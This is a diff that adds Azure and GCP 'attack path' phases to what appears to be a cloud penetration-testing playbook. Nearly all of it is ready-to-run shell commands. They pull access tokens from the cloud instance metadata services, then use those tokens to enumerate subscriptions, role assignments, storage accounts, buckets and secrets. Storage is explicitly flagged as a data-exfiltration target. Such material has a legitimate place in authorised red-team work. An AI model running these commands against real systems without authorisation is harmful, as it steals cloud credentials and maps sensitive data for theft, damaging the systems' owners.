@@ -123,6 +123,106 @@ for f in os.listdir('/tmp/scout-report'):
 
 ---
 
+## Phase 2a — Azure Attack Path
+
+### Azure IMDS (if detected)
+```bash
+# Instance metadata — requires Metadata: true header (no auth token needed)
+curl -s -H "Metadata: true" \
+  "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | \
+  python3 -m json.tool 2>/dev/null | grep -E "subscriptionId|resourceGroupName|name|location" | head -20
+
+# Managed identity token for Azure Resource Manager
+AZURE_TOKEN=$(curl -s -H "Metadata: true" \
+  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | \
+  python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
+
+# Subscription ID from instance metadata
+SUB=$(curl -s -H "Metadata: true" \
+  "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | \
+  python3 -c "import sys,json; print(json.load(sys.stdin)['compute']['subscriptionId'])")
+```
+
+### Azure ARM Enumeration
+```bash
+# Enumerate all resources in the subscription
+curl -s -H "Authorization: Bearer $AZURE_TOKEN" \
+  "https://management.azure.com/subscriptions/$SUB/resources?api-version=2021-04-01" | \
+  python3 -c "import sys,json; d=json.load(sys.stdin); [print(r['type'],r['name']) for r in d.get('value',[])]" | head -30
+
+# Enumerate role assignments (what permissions does this identity have?)
+curl -s -H "Authorization: Bearer $AZURE_TOKEN" \
+  "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" | \
+  python3 -c "import sys,json; d=json.load(sys.stdin); [print(r['properties']['roleDefinitionId'].split('/')[-1], r['properties']['principalId']) for r in d.get('value',[])]" | head -20
+
+# List storage accounts (common data exfil target)
+curl -s -H "Authorization: Bearer $AZURE_TOKEN" \
+  "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Storage/storageAccounts?api-version=2023-01-01" | \
+  python3 -c "import sys,json; [print(a['name'],a['location']) for a in json.load(sys.stdin).get('value',[])]"
+```
+
+### ScoutSuite — Azure
+```bash
+scout azure --cli --no-browser --report-dir /tmp/scout-azure 2>/dev/null | tail -10
+```
+
+---
+
+## Phase 2b — GCP Attack Path
+
+### GCP Metadata Server (if detected)
+```bash
+# Metadata server — requires Metadata-Flavor: Google header
+curl -s -H "Metadata-Flavor: Google" \
+  "http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true" | \
+  python3 -m json.tool 2>/dev/null | grep -E "email|zone|id" | head -15
+
+# Service account access token
+GCP_TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
+  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | \
+  python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
+
+# Project ID (needed for most API calls)
+PROJECT=$(curl -s -H "Metadata-Flavor: Google" \
+  "http://metadata.google.internal/computeMetadata/v1/project/project-id")
+
+SA_EMAIL=$(curl -s -H "Metadata-Flavor: Google" \
+  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email")
+echo "SA: $SA_EMAIL in project $PROJECT"
+```
+
+### GCP Enumeration
+```bash
+# List GCS buckets in this project
+curl -s -H "Authorization: Bearer $GCP_TOKEN" \
+  "https://storage.googleapis.com/storage/v1/b?project=$PROJECT" | \
+  python3 -c "import sys,json; [print(b['name'],b.get('location','?')) for b in json.load(sys.stdin).get('items',[])]"
+
+# Get IAM policy for the project (what roles does this SA have?)
+curl -s -X POST -H "Authorization: Bearer $GCP_TOKEN" \
+  -H "Content-Type: application/json" -d '{}' \
+  "https://cloudresourcemanager.googleapis.com/v1/projects/$PROJECT:getIamPolicy" | \
+  python3 -c "
+import sys,json
+d = json.load(sys.stdin)
+for b in d.get('bindings',[]):
+    print(b['role'], b.get('members',[])[:3])
+" | head -20
+
+# List secrets (if secretmanager.secrets.list is granted)
+curl -s -H "Authorization: Bearer $GCP_TOKEN" \
+  "https://secretmanager.googleapis.com/v1/projects/$PROJECT/secrets" | \
+  python3 -c "import sys,json; [print(s['name']) for s in json.load(sys.stdin).get('secrets',[])]" | head -20
+```
+
+### ScoutSuite — GCP
+```bash
+# Requires service account credentials; attempt only if key material is available
+# scout gcp --service-account /tmp/sa.json --no-browser --report-dir /tmp/scout-gcp 2>/dev/null | tail -10
+```
+
+---
+
 ## Phase 3 — Kubernetes Attack Path
 
 ```bash
